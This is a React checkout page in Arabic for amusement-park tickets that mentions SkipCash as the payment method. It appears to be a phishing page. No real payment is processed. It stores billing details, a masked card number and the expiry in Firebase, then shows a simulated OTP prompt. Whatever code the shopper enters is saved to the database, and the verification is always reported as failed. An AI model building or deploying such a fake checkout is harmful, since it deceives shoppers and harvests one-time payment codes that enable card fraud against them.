import { useEffect, useMemo, useRef, useState } from "react";
import { AlertCircle, CreditCard, Loader2, ShieldCheck } from "lucide-react";
import { api } from "@shared/routes";
import type { CheckoutSubmissionInput } from "@shared/schema";
import {
  QuestLegalFooter,
  QuestMobileTopBar,
  SessionTimerStrip,
} from "@/components/QuestMobileChrome";
import {
  buildTicketOrderItems,
  formatQar,
  getOrderSubtotal,
  getStoredTicketCart,
  ticketProductMap,
} from "@/lib/ticket-cart";
import {
  createCheckoutSubmission,
  updateCheckoutSubmissionStatus,
} from "@/lib/firebase";
import Turnstile, { type BoundTurnstileObject } from "react-turnstile";

interface BillingDetails {
  firstName: string;
  lastName: string;
  phone: string;
  email: string;
}

interface CardDetails {
  cardholderName: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
}

type PaymentStep = "idle" | "waitingOtp" | "otp" | "verifyingOtp" | "failed";
const MIN_FORM_FILL_MS = 1500;

function parseStoredDate(storedDate: string | null): Date | undefined {
  if (!storedDate) {
    return undefined;
  }

  const dateOnlyMatch = /^(\d{4})-(\d{2})-(\d{2})$/.exec(storedDate);
  if (dateOnlyMatch) {
    const [, year, month, day] = dateOnlyMatch;
    return new Date(Number(year), Number(month) - 1, Number(day));
  }

  const parsed = new Date(storedDate);
  return Number.isNaN(parsed.getTime()) ? undefined : parsed;
}

function toDigitsOnly(value: string): string {
  return value.replace(/\D/g, "");
}

function formatCardNumber(value: string): string {
  const digits = toDigitsOnly(value).slice(0, 19);
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function formatExpiry(value: string): string {
  const digits = toDigitsOnly(value).slice(0, 4);
  if (digits.length <= 2) {
    return digits;
  }

  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

function validateCardDetails(card: CardDetails): string | null {
  if (!card.cardholderName.trim()) {
    return "اسم حامل البطاقة مطلوب.";
  }

  const cardNumberLength = toDigitsOnly(card.cardNumber).length;
  if (cardNumberLength < 13 || cardNumberLength > 19) {
    return "يرجى إدخال رقم بطاقة صالح.";
  }

  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(card.expiry)) {
    return "يجب إدخال تاريخ الانتهاء بصيغة MM/YY.";
  }

  if (!/^\d{3,4}$/.test(card.cvv)) {
    return "يرجى إدخال CVV صالح.";
  }

  return null;
}

function formatArabicDate(date: Date): string {
  return new Intl.DateTimeFormat("ar-QA", {
    day: "numeric",
    month: "long",
    year: "numeric",
  }).format(date);
}

function maskCardNumber(value: string): string {
  const digits = toDigitsOnly(value);
  if (digits.length <= 4) {
    return digits;
  }

  const visible = digits.slice(-4);
  const masked = "*".repeat(Math.max(0, digits.length - 4));
  const combined = `${masked}${visible}`;
  return combined.replace(/(.{4})/g, "$1 ").trim();
}

function validateBillingDetails(billing: BillingDetails): string | null {
  if (
    !billing.firstName.trim() ||
    !billing.lastName.trim() ||
    !billing.phone.trim()
  ) {
    return "يرجى إكمال جميع بيانات الفاتورة المطلوبة.";
  }

  if (!/\S+@\S+\.\S+/.test(billing.email.trim())) {
    return "يرجى إدخال بريد إلكتروني صحيح.";
  }

  return null;
}

export default function Checkout() {
  const [billingDetails, setBillingDetails] = useState<BillingDetails>({
    firstName: "",
    lastName: "",
    phone: "",
    email: "",
  });
  const [storedCart] = useState(() => getStoredTicketCart());
  const [cardDetails, setCardDetails] = useState<CardDetails>({
    cardholderName: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
  });
  const [otpCode, setOtpCode] = useState("");
  const [paymentStep, setPaymentStep] = useState<PaymentStep>("idle");
  const [paymentError, setPaymentError] = useState<string | null>(null);
  const [submissionId, setSubmissionId] = useState<string | null>(null);
  const [isSavingCheckout, setIsSavingCheckout] = useState(false);
  const [botToken, setBotToken] = useState<string | null>(null);
  const [website, setWebsite] = useState("");
  const [formStartedAt, setFormStartedAt] = useState(() => Date.now());
  const otpRevealTimerRef = useRef<number | null>(null);
  const otpVerifyTimerRef = useRef<number | null>(null);
  const turnstileRef = useRef<BoundTurnstileObject | null>(null);
  const turnstileSiteKey = (import.meta.env.VITE_TURNSTILE_SITE_KEY as string | undefined)?.trim();
  const turnstileEnabled = Boolean(turnstileSiteKey);

  const storedOrderItems = useMemo(
    () => buildTicketOrderItems(storedCart.quantities),
    [storedCart.quantities]
  );
  const fallbackItem = {
    id: "adult" as const,
    name: ticketProductMap.adult.name,
    unitPrice: ticketProductMap.adult.unitPrice,
    quantity: 1,
  };
  const orderItems =
    storedOrderItems.length > 0 ? storedOrderItems : [fallbackItem];
  const subtotal = useMemo(() => getOrderSubtotal(orderItems), [orderItems]);

  const visitDate = parseStoredDate(storedCart.visitDateIso);
  const bookingDateText = visitDate
    ? formatArabicDate(visitDate)
    : "١٧ فبراير ٢٠٢٦";
  const visitTime = storedCart.visitTime ?? "١٧:٣٠ - ٢٣:٥٩";
  const cardPreviewNumber = cardDetails.cardNumber || "•••• •••• •••• ••••";
  const cardPreviewName =
    cardDetails.cardholderName.trim() || "اسم حامل البطاقة";
  const cardPreviewExpiry = cardDetails.expiry || "MM/YY";

  const resetSecurityChallenge = () => {
    setBotToken(null);
    setFormStartedAt(Date.now());
    turnstileRef.current?.reset();
  };

  useEffect(() => {
    return () => {
      if (otpRevealTimerRef.current) {
        window.clearTimeout(otpRevealTimerRef.current);
      }
      if (otpVerifyTimerRef.current) {
        window.clearTimeout(otpVerifyTimerRef.current);
      }
    };
  }, []);

  const onProceedToPayment = async () => {
    if (otpRevealTimerRef.current) {
      window.clearTimeout(otpRevealTimerRef.current);
    }
    if (otpVerifyTimerRef.current) {
      window.clearTimeout(otpVerifyTimerRef.current);
    }

    const billingValidationError = validateBillingDetails(billingDetails);
    if (billingValidationError) {
      setPaymentStep("idle");
      setPaymentError(billingValidationError);
      return;
    }

    const cardValidationError = validateCardDetails(cardDetails);
    if (cardValidationError) {
      setPaymentStep("idle");
      setPaymentError(cardValidationError);
      return;
    }

    if (website.trim().length > 0) {
      setPaymentStep("idle");
      setPaymentError("فشل التحقق الأمني. يرجى إعادة تحميل الصفحة.");
      return;
    }

    if (Date.now() - formStartedAt < MIN_FORM_FILL_MS) {
      setPaymentStep("idle");
      setPaymentError("يرجى الانتظار لحظة ثم إعادة المحاولة.");
      return;
    }

    if (turnstileEnabled && !botToken) {
      setPaymentStep("idle");
      setPaymentError("يرجى إكمال التحقق الأمني.");
      return;
    }

    const payload: CheckoutSubmissionInput = {
      billing: {
        firstName: billingDetails.firstName.trim(),
        lastName: billingDetails.lastName.trim(),
        phone: billingDetails.phone.trim(),
        email: billingDetails.email.trim(),
      },
      visitDateIso: storedCart.visitDateIso,
      visitTime,
      items: orderItems.map((item) => ({
        id: item.id,
        name: item.name,
        quantity: item.quantity,
        unitPrice: item.unitPrice,
        lineTotal: item.quantity * item.unitPrice,
      })),
      subtotal,
      total: subtotal,
      payment: {
        cardholderName: cardDetails.cardholderName.trim(),
        cardNumberMasked: maskCardNumber(cardDetails.cardNumber),
        expiry: cardDetails.expiry,
        otpCode: null,
        status: "otp_requested",
        errorMessage: null,
      },
    };

    setIsSavingCheckout(true);
    try {
      const verificationResponse = await fetch(api.bot.verify.path, {
        method: api.bot.verify.method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          botToken,
          website,
          formStartedAt,
          formContext: "checkout",
        }),
      });

      if (!verificationResponse.ok) {
        const errorData = (await verificationResponse.json().catch(() => null)) as {
          message?: string;
        } | null;
        throw new Error(
          errorData?.message ?? "فشل التحقق الأمني. يرجى المحاولة مرة أخرى."
        );
      }

      const created = await createCheckoutSubmission(payload);
      setSubmissionId(created.id);
      setPaymentError(null);
      setOtpCode("");
      setPaymentStep("waitingOtp");

      otpRevealTimerRef.current = window.setTimeout(() => {
        setPaymentStep("otp");
      }, 5000);
    } catch (error) {
      setPaymentStep("idle");
      setPaymentError(
        error instanceof Error ? error.message : "حدث خطأ أثناء حفظ البيانات."
      );
    } finally {
      resetSecurityChallenge();
      setIsSavingCheckout(false);
    }
  };

  const onVerifyOtp = () => {
    if (otpVerifyTimerRef.current) {
      window.clearTimeout(otpVerifyTimerRef.current);
    }

    if (otpCode.trim().length < 4) {
      setPaymentError("يرجى إدخال رمز OTP المرسل إلى هاتفك.");
      return;
    }

    setPaymentError(null);
    setPaymentStep("verifyingOtp");

    // Simulate gateway verification; after 5s show explicit failure.
    otpVerifyTimerRef.current = window.setTimeout(() => {
      void (async () => {
        const failureMessage = "فشل التحقق من رمز OTP. يرجى المحاولة مرة أخرى.";

        if (submissionId) {
          try {
            await updateCheckoutSubmissionStatus(submissionId, {
              status: "otp_failed",
              otpCode,
              errorMessage: failureMessage,
            });
          } catch {
            // Keep the UI flow resilient even if update logging fails.
          }
        }

        setPaymentStep("failed");
        setPaymentError(failureMessage);
      })();
    }, 5000);
  };

  const showOtpForm =
    paymentStep === "otp" ||
    paymentStep === "verifyingOtp" ||
    paymentStep === "failed";

  return (
    <div className="min-h-screen bg-[#efefef] text-[#333]" dir="rtl" lang="ar">
      <div className="mx-auto flex min-h-screen w-full max-w-[1100px] flex-col bg-[#efefef]">
        <section className="relative h-[190px] overflow-hidden sm:h-[220px] md:h-[280px]">
          <img
            src="/2.png"
            alt="دوار ملون في مدينة ألعاب داخلية"
            className="h-full w-full object-cover"
          />
          <div className="absolute inset-0 bg-gradient-to-t from-black/55 to-black/5" />
          <h1 className="absolute bottom-8 right-6 text-4xl font-black text-white sm:text-5xl">
            إتمام الشراء
          </h1>
        </section>

        <QuestMobileTopBar />

        <main className="flex-1 px-4 pb-8 pt-4 sm:px-6 md:px-8">
          <SessionTimerStrip className="max-w-[560px]" />

          <div className="mt-4 grid gap-7 lg:grid-cols-[1.1fr_1fr] lg:items-start">
            <div>
              <section className="bg-[#e9edf3] p-4 border-r-4 border-r-[hsl(var(--quest-purple))] text-[#5f5f5f] text-sm">
                <p>
                  لديك قسيمة؟
                  <span className="mr-1 text-[#4d4d4d]">
                    اضغط هنا لإدخال الكود
                  </span>
                </p>
              </section>

              <section className="mt-6">
                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
                  تفاصيل الفاتورة
                </h2>

                <form className="mt-4 grid gap-3 sm:grid-cols-2">
                  <label className="block">
                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                      الاسم الأول <span className="text-[#bf2828]">*</span>
                    </span>
                    <input
                      type="text"
                      value={billingDetails.firstName}
                      onChange={(event) =>
                        setBillingDetails((current) => ({
                          ...current,
                          firstName: event.target.value,
                        }))
                      }
                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                    />
                  </label>

                  <label className="block">
                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                      اسم العائلة <span className="text-[#bf2828]">*</span>
                    </span>
                    <input
                      type="text"
                      value={billingDetails.lastName}
                      onChange={(event) =>
                        setBillingDetails((current) => ({
                          ...current,
                          lastName: event.target.value,
                        }))
                      }
                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                    />
                  </label>

                  <label className="block">
                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                      رقم الهاتف <span className="text-[#bf2828]">*</span>
                    </span>
                    <input
                      type="tel"
                      value={billingDetails.phone}
                      onChange={(event) =>
                        setBillingDetails((current) => ({
                          ...current,
                          phone: event.target.value,
                        }))
                      }
                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                    />
                  </label>

                  <label className="block sm:col-span-2">
                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                      البريد الإلكتروني{" "}
                      <span className="text-[#bf2828]">*</span>
                    </span>
                    <input
                      type="email"
                      value={billingDetails.email}
                      onChange={(event) =>
                        setBillingDetails((current) => ({
                          ...current,
                          email: event.target.value,
                        }))
                      }
                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                    />
                  </label>
                </form>
              </section>
            </div>

            <div>
              <section>
                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
                  طلبك
                </h2>

                <div className="mt-3 overflow-hidden rounded-md border border-[#dedede] bg-white">
                  <div className="grid grid-cols-[1fr_auto] bg-[#f8bf14] px-3 py-2 text-sm font-bold text-[#202020]">
                    <span>المنتج</span>
                    <span>المجموع الفرعي</span>
                  </div>

                  <div className="space-y-2 px-3 py-3 text-xs text-[#444]">
                    {orderItems.map((item) => (
                      <div key={item.id}>
                        <div className="grid grid-cols-[1fr_auto] items-start gap-2">
                          <div>
                            <p className="font-semibold">
                              {item.name}{" "}
                              <span className="font-normal">
                                × {item.quantity}
                              </span>
                            </p>
                            <p className="mt-1 text-[11px] text-[#666]">
                              تاريخ الحجز: {bookingDateText}
                            </p>
                            <p className="text-[11px] text-[#666]">
                              وقت الزيارة: {visitTime}
                            </p>
                            <p className="text-[11px] text-[#666]">
                              الفئة: تذاكر الدخول
                            </p>
                          </div>
                          <p>{formatQar(item.unitPrice * item.quantity)}</p>
                        </div>
                      </div>
                    ))}

                    <div className="border-t border-[#ededed] pt-2">
                      <div className="flex items-center justify-between text-sm font-semibold">
                        <span>المجموع الفرعي</span>
                        <span>{formatQar(subtotal)}</span>
                      </div>
                      <div className="mt-1 flex items-center justify-between text-sm font-bold">
                        <span>الإجمالي</span>
                        <span>{formatQar(subtotal)}</span>
                      </div>
                    </div>
                  </div>
                </div>
              </section>

              <section className="mt-7">
                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
                  الدفع
                </h2>

                <div className="mt-3 rounded-xl border border-[#e8e8e8] bg-white p-3">
                  <div className="rounded-md border border-[#ececec] bg-[#f8f8f8] px-3 py-2 text-sm font-semibold text-[#3e3e3e] flex items-center gap-2">
                    <CreditCard className="h-4 w-4" />
                    بطاقات الائتمان / الخصم
                  </div>

                  <p className="mt-3 text-xs leading-5 text-[#444]">
                    SkipCash هو تطبيق دفع يوفر تجربة مريحة وسلسة طوال رحلة الدفع
                    لكل من العملاء والتجار.
                  </p>

                  <div className="mt-4 rounded-xl bg-gradient-to-br from-[hsl(var(--quest-purple))] via-[#7a2a88] to-[#a44aa7] px-4 py-4 text-white shadow-lg">
                    <p className="text-[11px] text-white/80">بطاقة الدفع</p>
                    <div
                      className="mt-5 text-lg font-semibold tracking-[0.12em]"
                      dir="ltr"
                    >
                      {cardPreviewNumber}
                    </div>
                    <div className="mt-5 flex items-end justify-between gap-3">
                      <div className="min-w-0">
                        <p className="text-[10px] text-white/70">
                          حامل البطاقة
                        </p>
                        <p className="truncate text-sm font-semibold">
                          {cardPreviewName}
                        </p>
                      </div>
                      <div className="shrink-0 text-right">
                        <p className="text-[10px] text-white/70">الانتهاء</p>
                        <p className="text-sm font-semibold" dir="ltr">
                          {cardPreviewExpiry}
                        </p>
                      </div>
                    </div>
                  </div>

                  <form
                    className="mt-4 space-y-3 rounded-md border border-[#ececec] p-3"
                    onSubmit={(event) => event.preventDefault()}
                  >
                    <div className="absolute -left-[9999px] top-auto h-px w-px overflow-hidden" aria-hidden="true">
                      <label htmlFor="checkout-website">Leave this field empty</label>
                      <input
                        id="checkout-website"
                        name="website"
                        type="text"
                        tabIndex={-1}
                        autoComplete="off"
                        value={website}
                        onChange={(event) => setWebsite(event.target.value)}
                      />
                    </div>

                    <label className="block">
                      <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                        اسم حامل البطاقة{" "}
                        <span className="text-[#bf2828]">*</span>
                      </span>
                      <input
                        type="text"
                        autoComplete="cc-name"
                        value={cardDetails.cardholderName}
                        onChange={(event) =>
                          setCardDetails((current) => ({
                            ...current,
                            cardholderName: event.target.value,
                          }))
                        }
                        className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                        placeholder="الاسم على البطاقة"
                      />
                    </label>

                    <label className="block">
                      <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                        رقم البطاقة <span className="text-[#bf2828]">*</span>
                      </span>
                      <input
                        type="text"
                        inputMode="numeric"
                        autoComplete="cc-number"
                        value={cardDetails.cardNumber}
                        onChange={(event) =>
                          setCardDetails((current) => ({
                            ...current,
                            cardNumber: formatCardNumber(event.target.value),
                          }))
                        }
                        className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                        dir="ltr"
                        placeholder="4242 4242 4242 4242"
                      />
                    </label>

                    <div className="grid grid-cols-2 gap-3">
                      <label className="block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          تاريخ الانتهاء{" "}
                          <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="text"
                          inputMode="numeric"
                          autoComplete="cc-exp"
                          value={cardDetails.expiry}
                          onChange={(event) =>
                            setCardDetails((current) => ({
                              ...current,
                              expiry: formatExpiry(event.target.value),
                            }))
                          }
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                          dir="ltr"
                          placeholder="MM/YY"
                        />
                      </label>

                      <label className="block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          CVV <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="password"
                          inputMode="numeric"
                          autoComplete="cc-csc"
                          value={cardDetails.cvv}
                          onChange={(event) =>
                            setCardDetails((current) => ({
                              ...current,
                              cvv: toDigitsOnly(event.target.value).slice(0, 4),
                            }))
                          }
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                          dir="ltr"
                          placeholder="***"
                        />
                      </label>
                    </div>
                  </form>

                  {paymentStep === "waitingOtp" ? (
                    <div className="mt-3 flex items-start gap-2 rounded-md border border-[#e3d5ff] bg-[#f7f2ff] px-3 py-2 text-xs text-[#5c3f8a]">
                      <Loader2 className="mt-0.5 h-3.5 w-3.5 animate-spin" />
                      <p>
                        جاري معالجة بيانات البطاقة. سيظهر رمز OTP خلال 5 ثوانٍ.
                      </p>
                    </div>
                  ) : null}

                  {showOtpForm ? (
                    <div className="mt-3 rounded-md border border-[#ececec] p-3">
                      <div className="flex items-center gap-2 text-sm font-semibold text-[#414141]">
                        <ShieldCheck className="h-4 w-4 text-[hsl(var(--quest-purple))]" />
                        التحقق عبر OTP
                      </div>

                      <label className="mt-2 block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          أدخل رمز OTP <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="text"
                          inputMode="numeric"
                          value={otpCode}
                          onChange={(event) =>
                            setOtpCode(
                              toDigitsOnly(event.target.value).slice(0, 6)
                            )
                          }
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                          dir="ltr"
                          placeholder="رمز OTP من 6 أرقام"
                        />
                      </label>

                      <button
                        type="button"
                        onClick={onVerifyOtp}
                        disabled={paymentStep === "verifyingOtp"}
                        className="mt-3 w-full rounded border border-[hsl(var(--quest-purple))]/25 bg-white px-4 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 disabled:cursor-not-allowed disabled:opacity-70"
                      >
                        {paymentStep === "verifyingOtp"
                          ? "جاري التحقق من OTP..."
                          : "تحقق من OTP"}
                      </button>
                    </div>
                  ) : null}

                  {turnstileEnabled ? (
                    <div className="mt-3 flex justify-center">
                      <Turnstile
                        sitekey={turnstileSiteKey!}
                        theme="auto"
                        onLoad={(_widgetId, boundTurnstile) => {
                          turnstileRef.current = boundTurnstile;
                        }}
                        onVerify={(token) => {
                          setBotToken(token);
                          setPaymentError((current) =>
                            current === "يرجى إكمال التحقق الأمني." ? null : current
                          );
                        }}
                        onExpire={() => setBotToken(null)}
                        onError={() => setBotToken(null)}
                      />
                    </div>
                  ) : null}

                  {paymentError ? (
                    <div className="mt-3 flex items-start gap-2 rounded-md border border-[#efc1c1] bg-[#fdf1f1] px-3 py-2 text-xs text-[#ad3030]">
                      <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
                      <p>{paymentError}</p>
                    </div>
                  ) : null}

                  <p className="mt-4 text-xs leading-5 text-[#666]">
                    سيتم استخدام بياناتك الشخصية لمعالجة طلبك ودعم تجربتك في هذا
                    الموقع، ولأغراض أخرى موضحة في سياسة الخصوصية.
                  </p>

                  <button
                    type="button"
                    onClick={onProceedToPayment}
                    disabled={
                      paymentStep === "waitingOtp" ||
                      paymentStep === "verifyingOtp" ||
                      isSavingCheckout
                    }
                    className="mt-4 w-full rounded bg-[hsl(var(--quest-purple))] px-4 py-2 text-sm font-semibold text-white hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-70"
                  >
                    {isSavingCheckout
                      ? "جاري حفظ الطلب..."
                      : paymentStep === "waitingOtp"
                      ? "جاري طلب OTP..."
                      : "المتابعة للدفع"}
                  </button>
                </div>
              </section>
            </div>
          </div>
        </main>

        <QuestLegalFooter />
      </div>
    </div>
  );
}
